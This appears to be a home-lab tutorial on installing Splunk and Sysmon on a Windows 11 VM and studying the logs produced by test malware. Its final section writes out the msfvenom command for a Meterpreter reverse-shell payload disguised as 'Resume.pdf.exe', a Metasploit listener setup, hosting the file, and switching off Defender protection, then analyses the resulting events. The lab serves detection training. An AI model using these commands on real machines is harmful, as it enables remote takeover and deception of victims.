#### Installing Splunk On Windows 11 Pro VM
Step 1: Head over to https://www.splunk.com/en_us/download/splunk-enterprise.html. Create an account for a free download.  
<img width="973" height="490" alt="image" src="https://github.com/user-attachments/assets/64793a93-30e2-4e74-ad46-59c47dcbbc6c" />

Step 2: Create a free account then proceed to the download page. Download for the OS you are running. In my case for Windows.
<img width="975" height="815" alt="image" src="https://github.com/user-attachments/assets/adb0f770-c827-4302-a038-f44387b940e2" />

Step 3: Initialize Splunk Installer        
<img width="975" height="821" alt="image" src="https://github.com/user-attachments/assets/bc455132-1d3f-4fd2-9d1a-6c8bd099f374" />
<img width="975" height="810" alt="image" src="https://github.com/user-attachments/assets/d7678aa5-2a19-4708-8292-16f76a65d7de" />
<img width="975" height="810" alt="image" src="https://github.com/user-attachments/assets/8272161b-ba81-4d08-b1a6-9f6ddd02e957" />
<img width="975" height="873" alt="image" src="https://github.com/user-attachments/assets/9eb19bf1-678f-4b93-9470-9d99159a2f7e" />
<img width="975" height="804" alt="image" src="https://github.com/user-attachments/assets/c5a890f5-69c5-4aa4-960e-91fd4d824c74" />
<img width="975" height="815" alt="image" src="https://github.com/user-attachments/assets/d75c7fea-31ca-46fc-9700-15bd7fbe0066" />
<img width="975" height="802" alt="image" src="https://github.com/user-attachments/assets/3c066470-9e7a-4641-8c49-cebbacdcb2c2" />

Step 4: Login to Splunk Account 
<img width="975" height="821" alt="image" src="https://github.com/user-attachments/assets/0ff5de6b-b220-4966-ae3b-acebb8385348" />

Step 5: Lets demo and explore Splunk by adding some data! From the home page click “add data”  
<img width="975" height="810" alt="image" src="https://github.com/user-attachments/assets/7628ef9f-e5d2-4817-94c2-438c21865346" />

Step 6: Scroll Down and click “Monitor” 
<img width="975" height="802" alt="image" src="https://github.com/user-attachments/assets/42a10274-6d63-4a8f-b13e-cc177e5308fb" />

Step 7: click on “Local Event Logs” and choose which event logs you want to monitor. I will choose Application, Security, and system but you are free to choose based on use case. I am just showing one of the many things you can do with Splunk.  
<img width="975" height="817" alt="image" src="https://github.com/user-attachments/assets/1dd83d89-0590-4145-ae79-e1b17294f7e7" />

Step 8: once you click next change “Index” from “Default” from “Main”. Main should be the deafult but just making sure we choose “main”.  
<img width="975" height="815" alt="image" src="https://github.com/user-attachments/assets/305b235f-874b-4f37-a691-4be133b42aef" />

Step 9: Click “Review” then hit Submit 
<img width="975" height="804" alt="image" src="https://github.com/user-attachments/assets/830fd721-3c73-41d9-9521-120fa58c4a57" />

Step 10: Click Start Searching 
<img width="975" height="804" alt="image" src="https://github.com/user-attachments/assets/c24f6d71-e3b3-40f8-91b0-ecaf4e282861" />

Step 11: Now we can start analyzing specific events!  
<img width="975" height="810" alt="image" src="https://github.com/user-attachments/assets/bc37da2f-7bc1-4050-ab98-e6d93db4355a" />

Step 12: For example. We can search up a specific Event Code and correlate that to a specific event by simply searching up the event code.
 <img width="975" height="810" alt="image" src="https://github.com/user-attachments/assets/1526ce84-55f1-46e4-9f48-004ae52fb9a4" />
<img width="975" height="806" alt="image" src="https://github.com/user-attachments/assets/486ea2dd-acce-4d4c-b75b-b11c5c476655" />

#### Installing Sysmon 
Step 1: Head to https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon. Then click download based on your OS platform.
<img width="975" height="813" alt="image" src="https://github.com/user-attachments/assets/b107b1de-b6bd-48aa-9923-e0a9edec1b59" />

Step 2: Now lets install the configuration files. Head to https://github.com/olafhartong/sysmon-modular/blob/master/sysmonconfig.xml. Then click “Raw”  
<img width="975" height="804" alt="image" src="https://github.com/user-attachments/assets/ab454e64-7c97-4b66-a747-fa285d483d1a" />

Step 3: Right click + Save as any location you want.  
<img width="975" height="810" alt="image" src="https://github.com/user-attachments/assets/ced7e60e-9d26-4d4d-8296-8d1c58f3717e" />

Step 4: Lets go back to the sysmon zip we downloaded before and extract all of its contents by right clicking the folder and clicking “Extract All”.    
<img width="975" height="815" alt="image" src="https://github.com/user-attachments/assets/09431c46-eed8-4bf2-a171-ca7e44b82671" />
<img width="971" height="704" alt="image" src="https://github.com/user-attachments/assets/a931c49b-375a-4ce5-9436-da124f752d07" />
<img width="975" height="763" alt="image" src="https://github.com/user-attachments/assets/1f2e7028-0fd8-47b3-9703-6863a94a2146" />

Step 5: Open a Powershell window with run as admin.    
<img width="975" height="808" alt="image" src="https://github.com/user-attachments/assets/6fbbcdf8-d488-47ba-9bcf-2e7bae5b15fc" />
<img width="746" height="579" alt="image" src="https://github.com/user-attachments/assets/5e2cc344-bcf1-4381-849c-023508593cbf" />
<img width="975" height="517" alt="image" src="https://github.com/user-attachments/assets/c4c089ad-7b0e-4889-bd89-8cccece252d4" />

Step 6: Copy file path where you extracted the files to by going to search bar, highlight, right click + copy.  
<img width="975" height="819" alt="image" src="https://github.com/user-attachments/assets/14e20784-4445-4ce0-b90a-09d1287efb06" />

Step 7: type in “cd ‘right + click’ on Powershell then press enter. This command moves you to the directory of the copied file path.   
<img width="975" height="517" alt="image" src="https://github.com/user-attachments/assets/056e7503-7af1-4084-953a-26e07f01b704" />

Step 8: Move the config files to the sysmon folder we extracted.  
<img width="975" height="742" alt="image" src="https://github.com/user-attachments/assets/41c052a6-42fb-47c8-bf79-adbcc4264c3d" />

Step 9: [Option 1] lets install sysmon by typing in command “.\Sysmon64.exe” + enter while in the directory of the sysmon folder. I chose 64 because I am running a 64-bit system.  
<img width="975" height="817" alt="image" src="https://github.com/user-attachments/assets/27da1f02-cd7f-4ea7-aeba-5d18405e2a89" />

Step 10: [Option 2] lets install sysmon by using the config file to install it. Type in command “.\sysmon64.exe -i sysmonconfig.xml + Enter” in Powershell. Make sure you are in the directory of the sysmon folder.  
<img width="975" height="815" alt="image" src="https://github.com/user-attachments/assets/2363a255-373f-4831-ae82-47ca16d94a23" />
<img width="975" height="521" alt="image" src="https://github.com/user-attachments/assets/62a05fd6-ca67-4c21-8ca2-65ce219d99ff" />

Step 11: Lets check if Sysmon installed properly by going to search “Event Viewer”. 
<img width="975" height="815" alt="image" src="https://github.com/user-attachments/assets/b64caefc-2748-4ec3-9aa4-de996d4f0659" />

Step 12: Expand App and Services Logs > Microsoft > Windows, then look for “Sysmon”. 
<img width="975" height="810" alt="image" src="https://github.com/user-attachments/assets/32a3b71d-646f-4f88-bca6-a3d666d230e2" />
<img width="975" height="688" alt="image" src="https://github.com/user-attachments/assets/e7f4c847-5e25-4187-94d1-0be70c9410aa" />
<img width="975" height="688" alt="image" src="https://github.com/user-attachments/assets/dc64d13c-4cd0-499e-a1fc-fd35f113ec3d" />

Step 13: Lets check if Sysmon is in services by searching “Services”.   
<img width="975" height="808" alt="image" src="https://github.com/user-attachments/assets/2e244b05-6020-40d3-b7d5-031ca18751ac" />
<img width="975" height="819" alt="image" src="https://github.com/user-attachments/assets/6ec78305-86f9-4a86-84b3-7e624a125c51" />

Step 14: Back to Event Viewer… Now we can go on Sysmon > Operational and view a bunch of useful telematry!  
<img width="975" height="725" alt="image" src="https://github.com/user-attachments/assets/09a0ec64-e310-47e5-9f75-19035057bc2e" />

#### Configuring Splunk To Ingest Sysmon Logs
Step 1: Download the custom “inputs.conf” file at https://tinyurl.com/MyDFIR-Splunk-Inputs. This custom input configures splunk to ingest sysmon logs.  
<img width="975" height="954" alt="image" src="https://github.com/user-attachments/assets/52d6ffe6-fdbb-4e99-a072-535cf98a7f3d" />

Step 2: Lets place the “inputs.conf” file that we downloaded to the right place. Go to File Explorer > This PC > Local disk > program files > Splunk > etc > system > local       
<img width="975" height="731" alt="image" src="https://github.com/user-attachments/assets/47f6b198-7d69-46c6-af8e-0c926925e7ab" />
<img width="975" height="735" alt="image" src="https://github.com/user-attachments/assets/b0e11acf-0518-40d6-8d6d-5d801a873a79" />
<img width="975" height="738" alt="image" src="https://github.com/user-attachments/assets/90bec017-82f4-4471-8169-18cb8187ddc5" />
<img width="975" height="733" alt="image" src="https://github.com/user-attachments/assets/274c7569-46ff-4c0b-a8d6-f94b7c0a8f61" />
<img width="975" height="731" alt="image" src="https://github.com/user-attachments/assets/210fec1b-8680-4103-b523-5f9ac976976b" />
<img width="975" height="744" alt="image" src="https://github.com/user-attachments/assets/be1262f9-6e4a-44d2-ab1b-94ebdca4d6e6" />
<img width="975" height="738" alt="image" src="https://github.com/user-attachments/assets/922d9fd1-ea2a-4886-904e-b2d995a75df9" />


Step 3: Copy the “inputs.conf” file that we downloaded here.  
<img width="975" height="742" alt="image" src="https://github.com/user-attachments/assets/5956e53b-49a3-46b8-a2c6-4ba2a5e7c89f" />

Step 3.1: Restart Splunk Service. Search “Services” > Find “Splunkd Service” > Right click, Restart.   
<img width="975" height="813" alt="image" src="https://github.com/user-attachments/assets/92ef3c1f-f806-4e06-af53-d054adece5ac" />
<img width="975" height="817" alt="image" src="https://github.com/user-attachments/assets/2f8ed459-8f47-4dea-aa6f-c2289953063a" />

Step 4: Create an index called “Endpoint” so our custom “inputs.conf” file works. Basically this transfers logs from sysmon/Operational to splunk index. Open up Splunk from the home page go on settings > New Index, Name = endpoint, save.    
<img width="975" height="813" alt="image" src="https://github.com/user-attachments/assets/5cc0b15a-502b-4d04-bc23-eed64e7a7c80" />
<img width="975" height="810" alt="image" src="https://github.com/user-attachments/assets/f91fde3b-1e90-4a3a-b824-5e8b874c2836" />
<img width="975" height="810" alt="image" src="https://github.com/user-attachments/assets/125dcf57-0c0a-4fca-b2fa-21a2e325752b" />
<img width="975" height="813" alt="image" src="https://github.com/user-attachments/assets/f8d38681-f73f-4bda-83c5-3dc96f9a84f9" />
<img width="975" height="810" alt="image" src="https://github.com/user-attachments/assets/b98bbf5b-9ad2-4bc5-9cc2-3b689fbec510" />
<img width="975" height="802" alt="image" src="https://github.com/user-attachments/assets/516bc234-85e1-456d-b174-97ceeec87713" />

Step 5: Let’s verify if Splunk is ingesting Sysmon logs. Now go on App > search & reporting > search = “index=endpoint” press enter   
<img width="975" height="808" alt="image" src="https://github.com/user-attachments/assets/6eddc4fb-cd19-4c77-9d81-9963afaa83f0" />
<img width="975" height="810" alt="image" src="https://github.com/user-attachments/assets/7f29f35c-e0ad-4579-9452-c46965a96b15" />
<img width="975" height="813" alt="image" src="https://github.com/user-attachments/assets/6678ed69-a2e1-4128-9feb-348a55e448d0" />
<img width="975" height="802" alt="image" src="https://github.com/user-attachments/assets/b5dc408f-a9f0-4840-a10d-860ffaa3e769" />

Step 6: Lets make sure that Sysmon parses automatically to splunk by downloading an app in Splunk. Go to App > Find More apps > Search = “Sysmon” > Install “Splunk Add-on for Sysmon. 
<img width="975" height="815" alt="image" src="https://github.com/user-attachments/assets/d63f94c2-b45a-4ed0-b815-7ea5e79bb6a1" />
<img width="975" height="813" alt="image" src="https://github.com/user-attachments/assets/40f7ac4a-c3b5-49aa-82bd-210111a8e3ed" />
<img width="975" height="810" alt="image" src="https://github.com/user-attachments/assets/24e23180-f7f3-40be-8b71-5175c320e7b5" />

Step 7: This should add additional field when searching “index=endpoint”.  
<img width="975" height="800" alt="image" src="https://github.com/user-attachments/assets/07cd3bee-5729-48e2-abe7-079a53dba63c" />

#### Creating and Using Malware To Test and Analyze Splunk and Sysmon Telemetry
Step 1: Make sure to use “Internal Network” Settings for Windows 11 Pro and Kali Linux VM. 
<img width="975" height="656" alt="image" src="https://github.com/user-attachments/assets/64b0b32d-8856-44cf-b2d6-ee4f25522a70" />
<img width="975" height="1052" alt="image" src="https://github.com/user-attachments/assets/2b4eab01-0182-4736-8b72-998a36a401ee" />
<img width="975" height="621" alt="image" src="https://github.com/user-attachments/assets/f7ca356c-adad-4a43-a46c-d54865d1e967" />

Step 2: Verify Win11 Pro VM and Kali VM are on the same network and have the appropriate IP addressing.
<img width="975" height="806" alt="image" src="https://github.com/user-attachments/assets/5ef23730-7088-4b7a-8473-8023ee3fe74f" />
<img width="975" height="835" alt="image" src="https://github.com/user-attachments/assets/5b8d7fde-1dc6-4b1c-b45e-462a098004bd" />

Step 3: Keep both IP addresses in mind. Win11 = 192.168.20.10 & Kali = 192.168.20.11
Step 4: Lets get started with NMAP by viewing the available commands. In the terminal do command “nmap -h”.  There are plenty of useful commands to use. For example “-A” will do a full scan aand adding a -Pn will skip pings.
<img width="975" height="846" alt="image" src="https://github.com/user-attachments/assets/5a995628-67e8-457f-bab5-90b4d738bc67" />
<img width="965" height="142" alt="image" src="https://github.com/user-attachments/assets/dd029763-cfa9-4159-8522-e324925ec877" />

Step 5: Lets do command “nmap -A 192.168.20.10 -Pn” to scan our Windows 11 VM and skipping ping to see what information we receive from the Win 11 VM.   
<img width="975" height="840" alt="image" src="https://github.com/user-attachments/assets/96f22c0e-8fd9-4ed1-bf22-8db8b18f2c99" />
<img width="975" height="840" alt="image" src="https://github.com/user-attachments/assets/bd4a4ccb-7a2f-48bc-862d-6500cfa439c7" />


Step 5.1: Lets create our malware using msfvenom. Do command “msfvenom + enter” in terminal.   
<img width="975" height="825" alt="image" src="https://github.com/user-attachments/assets/d921aad8-b383-49a8-8c3c-7889a20a25f2" />
<img width="975" height="167" alt="image" src="https://github.com/user-attachments/assets/45923848-31fa-4064-8322-5a91d29b1b7c" />

Step 6: Lets see the available payloads we have by doing command “msfvenom -l payloads”. There will be plenty listed but we are using the “windows/x64/meterpreter/reverse_tcp” payload. Take note of  “windows/x64/meterpreter/reverse_tcp” since that is the one we will use. 
<img width="975" height="835" alt="image" src="https://github.com/user-attachments/assets/5b7d95cd-aa9e-4318-a7d1-cd25785fd6cb" />

Step 7: Lets start by building out our malware. Do command “msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.20.11 lport=4444 -f exe -o Resume.pdf.exe + enter”. This command will generate malware using reverse tcp payload which is instructed to connect back to our kali machine and port. The file format will be .exe and file name is Resume.pdf.exe.  
<img width="975" height="842" alt="image" src="https://github.com/user-attachments/assets/3dc98246-3653-4e34-99bc-02fd29a6be8b" />

Step 8: Type command “ls” to verify that the file was created and type command “file Resume.pdf.exe” to check what file it is.
<img width="975" height="806" alt="image" src="https://github.com/user-attachments/assets/bd8a2376-345d-4e0d-9459-c7fc4534d6c6" />

Step 9: Now that we have our binary lets open up a handler that will listen in on the port that we have configured by using metasploit. Do command “msfconsole + enter” > “use exploit/multi/handler + enter”  
<img width="975" height="804" alt="image" src="https://github.com/user-attachments/assets/3e352012-d3e0-4519-acbe-63236b2c56c9" />

Step 10: do command “options” to see what we can configure. Notice that the payload option is set to “generic/shell_reverse_tcp” we need to use the same payload we used when configuring our malware in msfvenom. 
<img width="975" height="848" alt="image" src="https://github.com/user-attachments/assets/3afa3c8b-d49a-4fa9-b843-063d6bb7ed93" />

Step 11: lets change it. Do command “Set payload windows/x64/meterpreter/reverse_tcp + enter” then type command “options” again to verify the change.  
<img width="975" height="813" alt="image" src="https://github.com/user-attachments/assets/472cb7aa-ca32-4660-9b69-0d9d33e434a7" />

Step 12: Lets configure “LHOST” to correspond to our attacker machine (Kali) by doing command “set lhost 192.168.20.11 + enter” then command “options” to verify change.
<img width="975" height="842" alt="image" src="https://github.com/user-attachments/assets/06a1d36e-4ec8-42be-b415-0c904d4243aa" />

Step 13: Lets start this handler by doing command “exploit + enter”. Now we wait until the malware is executed in the Win 11 VM.
<img width="975" height="838" alt="image" src="https://github.com/user-attachments/assets/4c086fbc-7426-49a0-b617-9cbcb3e9dca8" />

Step 14: We need to create a fast http server using python so we can import our malware to the Win 11 VM. Click on “Session, New Tab” to open up a new tab. Make sure we are in the same directory as our malware by doing command “ls”.   
<img width="975" height="835" alt="image" src="https://github.com/user-attachments/assets/30efb64a-59c5-41bc-ac71-c92d8f88ef78" />
<img width="975" height="827" alt="image" src="https://github.com/user-attachments/assets/1ef3d21d-73c3-4472-825e-09a02c83cf7b" />

Step 15: Lets create the server. Do command “python3 -m http.server 9999 + enter”. After pressing enter the server is now live and hosting the malware file “Resume.pdf.exe”. 
<img width="975" height="835" alt="image" src="https://github.com/user-attachments/assets/fcadddf6-4dc8-452d-bb20-99781b7b6a81" />

Step 16: Lets switch over to our Win 11 Pro VM. First we need to turn off real time detection on Windows Security. Again we created a simple malware. Our main goal is to test Splunk and Sysmon when malware is executed. Search “Windows Security” > Virus & Threat protection > Virus & Threat protection settings > manage settings > turn off “Real-time protection”.
<img width="975" height="815" alt="image" src="https://github.com/user-attachments/assets/1a3a5e3c-91b1-4b80-94b4-6917ff707ffe" />
<img width="975" height="810" alt="image" src="https://github.com/user-attachments/assets/59b9b125-6d94-4b6e-a5f9-feae4e87cb4d" />
<img width="975" height="813" alt="image" src="https://github.com/user-attachments/assets/b3be45f4-bf96-433a-a673-89b82bfbee49" />
<img width="975" height="723" alt="image" src="https://github.com/user-attachments/assets/a02e245e-7764-4f6c-94b2-3e40a5a9702a" />

Step 17: Let's go to the python server we created by opening up a browser > search = 192.168.20.11:9999 + enter”. The ip address is the kali machine on port 9999. Download “Resume.pdf.exe”.  
<img width="975" height="813" alt="image" src="https://github.com/user-attachments/assets/ad1e2cea-ed06-4444-9dba-d3eb945c5c8e" />
<img width="975" height="817" alt="image" src="https://github.com/user-attachments/assets/50383ad9-cbc5-4bc4-a87f-cdfaa0ab03b4" />

Step 18: Let's execute the malware. Open “Resume.pdf.exe”  > click “Run” 
<img width="975" height="815" alt="image" src="https://github.com/user-attachments/assets/f089004b-9308-45f2-bcbb-16dc4079cbe3" />

Step 19: Lets return to the Splunk home page to see what useful telemetry we generated. Go to app > Search & Reporting > Search = “index=endpoint 192.168.20.11 + enter”. Lets first check what telemetry shows when we search up our kali machine ip of 192.168.20.11.    
<img width="975" height="917" alt="image" src="https://github.com/user-attachments/assets/9854ae11-a59e-407c-bd96-3dab858980ff" />
<img width="975" height="908" alt="image" src="https://github.com/user-attachments/assets/e20743d1-bfa5-4435-806d-f07e834a49e2" />
<img width="975" height="917" alt="image" src="https://github.com/user-attachments/assets/c95629e4-feeb-450e-b5c3-8ff1beb6d000" />

Step 20: Scroll down until you see “dest_port” then click on it  
<img width="975" height="908" alt="image" src="https://github.com/user-attachments/assets/bb1b219a-2cf7-4eca-99f9-b16ae73c4ddc" />

Step 21: This telematry tells us that ip 192.168.20.11 is attempting to reach port 4444. Port 4444 is commonly used by metasploit default payloads and other malware/command-and-control channels. For security context, if a machine is trying to reach port 4444 it may indicate an attempted reverse shell or remote exploitation attempt. Necessary actions to take next is to verify the source, check system for malware, set up firewall rules to block port 4444 if its not intended, and monitor network logs.
Step 22: Lets look at more telemetry. But this time lets search the malware name that was executed by typing in “index=endpoint resume.pdf.exe + enter”.   
<img width="975" height="900" alt="image" src="https://github.com/user-attachments/assets/93021cbf-96d0-43e6-aad3-f16abd501fd4" />

Step 23: As you can see we have logged 303 events. Scroll down until you see “EventCode” then click on it.  
<img width="975" height="913" alt="image" src="https://github.com/user-attachments/assets/bba7bc66-cf41-46a9-9e3e-0a9a542f72e5" />

Step 24: Lets focus on event code 1.
<img width="975" height="921" alt="image" src="https://github.com/user-attachments/assets/ae650c54-3cc2-4ebc-91e4-18ac6ea61f91" />

Step 25: We can see that event code 1 logged 30 events. Click on the latest event and expand it. Then scroll down and until you see “ProcessGuid”   
<img width="975" height="913" alt="image" src="https://github.com/user-attachments/assets/ab3b7464-8a21-4299-9054-d28276f4912d" />
<img width="975" height="913" alt="image" src="https://github.com/user-attachments/assets/9525ddf3-1f1f-4483-bebb-9fbaf085e796" />

Step 26: Copy and paste the “ProcessGuid” value into search bar so its “index=endpoint {ProcessGuidValue} + Enter” 
<img width="975" height="906" alt="image" src="https://github.com/user-attachments/assets/70c9414a-283d-4dd3-acf4-d4154ea0496e" />
<img width="975" height="879" alt="image" src="https://github.com/user-attachments/assets/c29717cd-d568-4098-9f00-985e41410c42" />

Step 27: 5 events is logged. Lets clean up the search query by adding in |table _time,ParentImage,Image,CommandLine after the “ProcessGuid”. So its “index=endpoint {ProccessGuid} |table _time,ParentImage,Image,CommandLine + enter”.    
<img width="975" height="906" alt="image" src="https://github.com/user-attachments/assets/221aa354-9649-4f4b-8158-50e1bfbc930b" />
<img width="975" height="904" alt="image" src="https://github.com/user-attachments/assets/c099dcf1-a519-4c26-a3f0-e0911a796ef8" />
<img width="975" height="773" alt="image" src="https://github.com/user-attachments/assets/519bdf49-e57c-44ce-b659-a531688261f3" />

Step 28: Lets analyze the ParentImage, Image, and CommandLine. Parent process “resume.pdf.exe” is suspicious because pdfs are never .exes. We can conclude that this is malware disguised as a pdf file. It was located in downloads which is common for malicious payloads. Child process “WerFault.exe” is a legitimate windows error reporting executable. However, it is suspicious because “resume.pdf.exe” spawned “WerFault.exe” which is not normal behavior. WerFault is usually triggered when covering up a crash it caused, run malicious code before or after a crash, and blending in with normal system process. Command line arguments “WerFault.exe -u -p 1052 -s 432” parameters are legitimate because Windows Error Reporting launches like this when a process crashes. In summary, malware “resume.pdf.exe” crashed, and WerFault was triggered to report it.



  







 



 



















  
